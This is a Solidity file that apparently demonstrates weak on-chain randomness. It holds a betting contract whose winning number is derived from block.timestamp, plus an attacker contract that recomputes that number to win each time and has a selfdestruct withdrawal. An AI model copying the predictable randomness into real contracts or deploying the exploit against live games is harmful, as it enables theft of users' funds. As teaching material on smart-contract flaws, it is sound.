// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract LuckyNumber is ReentrancyGuard {

    uint256 internal seed;
    uint256 internal luck;

    address private _owner;

    constructor() payable {
        _owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == _owner, "Come on man, u are not owner");
        _;
    }

    function luckyNumber(uint256 guess) public nonReentrant returns (bool) {
        seed = uint256(keccak256(abi.encodePacked(block.timestamp)));
        luck = uint256(keccak256(abi.encodePacked(seed))) % 100;

        if (guess == luck) {
            payable(msg.sender).transfer(1 ether);
            return true;
        }
        return false;
    }

    receive() external payable {}
    fallback() external payable {}

    function getBalance() public view onlyOwner returns (uint256) {
        return address(this).balance;
    }
}

contract AttackLuckyNum {

    uint256 internal seed;
    uint256 internal luck;

    address private _owner;

    LuckyNumber target;

    constructor(address payable _target) {
        _owner = msg.sender;
        target = LuckyNumber(_target);
    }

    modifier onlyOwner {
        require(msg.sender == _owner, ":(");
        _;
    }

    function attackGame() public {
        seed = uint256(keccak256(abi.encodePacked(block.timestamp)));
        luck = uint256(keccak256(abi.encodePacked(seed))) % 100;

        target.luckyNumber(luck);
    }

    receive() external payable {}
    fallback() external payable {}

    function ownedETH() public view onlyOwner returns (uint256) {
        return address(this).balance;
    }

    function goodbye() external onlyOwner {
        selfdestruct(payable(msg.sender));
    }
}